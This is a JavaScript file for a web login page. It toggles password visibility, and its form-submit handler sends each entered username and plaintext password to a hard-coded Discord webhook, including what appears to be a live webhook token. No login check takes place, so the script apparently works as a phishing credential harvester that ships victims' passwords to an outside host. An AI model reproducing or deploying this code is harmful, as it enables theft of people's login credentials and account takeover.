document.getElementById('togglePassword').addEventListener('click', function(event) {
    // Prevent form submission when the button is clicked
    event.preventDefault();

    // Get the password input element
    const passwordInput = document.getElementById('password');

    // Toggle the input type between 'password' and 'text'
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
    } else {
        passwordInput.type = 'password';
    }

    // Toggle the emoji (optional, if you want the emoji to change)
    this.textContent = (passwordInput.type === 'password') ? '👁️' : '🚫'; // Change emoji based on visibility
});

// Handle the form submission to send the login details to Discord (add webhook logic here)
document.querySelector("form").addEventListener("submit", function(event) {
    event.preventDefault();  // Prevent the default form submission

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (username && password) {
        // Send login details to Discord webhook
        const webhookUrl = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';
        const payload = {
            content: `User: ${username} has logged in with the password: ${password}`,
            username: 'Login System',
            avatar_url: 'https://example.com/avatar.png', // Replace with your avatar URL
            embeds: [
                {
                    title: 'New Login',
                    description: `User: ${username} has logged in with the password: ${password}`,
                    color: 7506394 // Grey color
                }
            ]
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(data => console.log('Message sent to Discord:', data))
        .catch(error => console.error('Error sending to Discord:', error));
    }
});
